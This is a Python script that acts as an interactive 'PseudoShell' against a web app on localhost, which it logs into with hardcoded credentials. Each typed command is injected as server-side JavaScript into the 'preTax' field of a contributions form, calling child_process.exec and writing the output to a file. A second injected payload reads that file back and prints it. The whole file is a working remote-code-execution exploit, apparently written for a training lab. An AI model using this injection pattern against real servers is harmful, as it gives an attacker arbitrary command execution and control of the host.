import requests

OUTPUT_FILENAME = "res.txt"
BASE_URL = "http://localhost:4000"
CONTRIBUTIONS = "/contributions"
LOGIN = "/login"
USERNAME = "user1"
PASSWORD = "User1_123"

loop = True

# show simple how to 
print("Welcome to the PseudoShell!")
print("Type 'exit' to exit the shell")
print("==============================")

session = requests.Session()
login_credentials = {
    "userName": USERNAME,
    "password": PASSWORD
}
session.post(BASE_URL + LOGIN, login_credentials)

while(loop):
    # get user input as a string in a variable path
    cmd = input("# ")
    if cmd == "exit":
        loop = False
        # say bye
        print("Bye!")
        break

    # output of command given will be written to a file
    rce = {
                "preTax": f'require("child_process").exec("{cmd}>{OUTPUT_FILENAME}")', 
                "roth": "2", 
                "afterTax": "2"
    }
    session.post(BASE_URL + CONTRIBUTIONS, rce)

    # read the file and print the output (contains the output of the command given)
    retrieve_rce_output = {
                "preTax": f'res.end(require("fs").readFileSync("{OUTPUT_FILENAME}"))', 
                "roth": "2", 
                "afterTax": "2"
    }
    r = session.post(BASE_URL + CONTRIBUTIONS, retrieve_rce_output)

    # print requests response
    print(r.text)